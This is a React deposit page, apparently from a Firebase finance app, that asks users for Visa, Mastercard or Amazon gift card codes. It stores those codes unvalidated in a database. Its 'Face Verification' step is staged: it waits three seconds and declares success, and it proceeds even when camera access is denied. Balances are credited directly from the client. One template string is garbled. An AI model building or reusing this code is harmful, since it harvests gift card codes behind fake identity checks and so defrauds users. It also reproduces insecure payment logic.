import { useState, useRef, useEffect } from 'react';
import { auth, db } from '../firebase';
import { doc, updateDoc, increment, collection, addDoc, serverTimestamp } from 'firebase/firestore';
import { useCurrency } from '../App';
import { requestNotificationPermission } from '../firebase';

const ADMIN_EMAILS = ['YOUR_EMAIL@gmail.com'];

export default function Deposit() {
  const { formatCurrency, convertToUserCurrency, preferredCurrency } = useCurrency();
  const [amount, setAmount] = useState(5000);
  const [method, setMethod] = useState('giftcard');
  const [giftCode, setGiftCode] = useState('');
  const [giftType, setGiftType] = useState('visa');
  const [loading, setLoading] = useState(false);
  const [showFaceModal, setShowFaceModal] = useState(false);
  const [faceVerified, setFaceVerified] = useState(false);
  const videoRef = useRef(null);

  const isAdmin = auth.currentUser && ADMIN_EMAILS.includes(auth.currentUser.email);
  const MIN_USD = 50;
  const minInUserCurrency = convertToUserCurrency(MIN_USD);

  useEffect(() => { requestNotificationPermission(); }, []);

  const startFaceScan = () => {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        if (videoRef.current) videoRef.current.srcObject = stream;
        setTimeout(() => {
          stream.getTracks().forEach(track => track.stop());
          setFaceVerified(true);
          setTimeout(() => { setShowFaceModal(false); actualDeposit(); }, 800);
        }, 3000);
      })
      .catch(() => { alert("Camera access denied – proceeding"); actualDeposit(); });
  };

  const actualDeposit = async () => {
    if (amount < minInUserCurrency && !isAdmin) {
      alert(`Minimum deposit is \[ {MIN_USD} USD equivalent (${formatCurrency(MIN_USD)})`);
      return;
    }
    setLoading(true);
    const userRef = doc(db, 'users', auth.currentUser.uid);
    await updateDoc(userRef, { balance: increment(amount) });
    await addDoc(collection(db, 'deposits'), {
      userId: auth.currentUser.uid,
      userEmail: auth.currentUser.email,
      type: method,
      amount: Number(amount),
      currency: preferredCurrency,
      giftCode: method === 'giftcard' ? giftCode : null,
      giftType: method === 'giftcard' ? giftType : null,
      date: serverTimestamp(),
      status: 'success'
    });
    alert(`✅ ${formatCurrency(amount)} added!`);
    setLoading(false);
    setGiftCode('');
  };

  const handleDepositClick = () => { setFaceVerified(false); setShowFaceModal(true); };

  return (
    <div className="max-w-2xl mx-auto p-6">
      <h1 className="text-3xl font-bold mb-8">Deposit Funds</h1>
      <div className="bg-gray-900 rounded-3xl p-8">
        <p className="text-emerald-400 text-xl mb-2">Your currency: <span className="font-mono">{preferredCurrency}</span></p>
        <p className="text-5xl font-bold mb-8">{formatCurrency(amount)}</p>
        <p className="text-amber-400 mb-6">Minimum deposit: ${MIN_USD} USD ({formatCurrency(MIN_USD)}) {isAdmin && " — Admin: No minimum"}</p>
        <div className="flex gap-4 mb-8">
          <button onClick={() => setMethod('credit')} className={`flex-1 py-4 rounded-2xl ${method === 'credit' ? 'bg-emerald-600' : 'bg-gray-800'}`}>Credit Card</button>
          <button onClick={() => setMethod('giftcard')} className={`flex-1 py-4 rounded-2xl ${method === 'giftcard' ? 'bg-emerald-600' : 'bg-gray-800'}`}>Gift Card</button>
        </div>
        {method === 'giftcard' && (
          <>
            <select value={giftType} onChange={e => setGiftType(e.target.value)} className="w-full bg-gray-800 p-4 rounded-2xl mb-4">
              <option value="visa">Visa Gift Card</option>
              <option value="master">Mastercard Gift</option>
              <option value="amazon">Amazon Gift</option>
            </select>
            <input type="text" placeholder="16-digit gift card code" value={giftCode} onChange={e => setGiftCode(e.target.value)} className="w-full bg-gray-800 p-4 rounded-2xl mb-4 font-mono" />
          </>
        )}
        <input type="range" min={minInUserCurrency} max="500000" step="1000" value={amount} onChange={e => setAmount(Number(e.target.value))} className="w-full mb-8 accent-emerald-500" />
        <button onClick={handleDepositClick} disabled={loading} className="w-full py-6 text-xl font-bold bg-emerald-500 hover:bg-emerald-600 rounded-3xl disabled:opacity-50">
          {loading ? 'Processing...' : `Deposit ${formatCurrency(amount)}`}
        </button>
      </div>
      {showFaceModal && (
        <div className="fixed inset-0 bg-black/90 flex items-center justify-center z-50">
          <div className="bg-gray-900 rounded-3xl p-8 max-w-md w-full text-center">
            <h2 className="text-2xl font-bold mb-6">Face Verification Required</h2>
            <video ref={videoRef} autoPlay className="w-full rounded-2xl mb-6" />
            {!faceVerified ? (
              <button onClick={startFaceScan} className="w-full py-4 bg-blue-600 rounded-3xl font-bold">Scan Face Now</button>
            ) : (
              <p className="text-emerald-400 text-xl">✅ Face Verified Successfully!</p>
            )}
          </div>
        </div>
      )}
    </div>
  );
}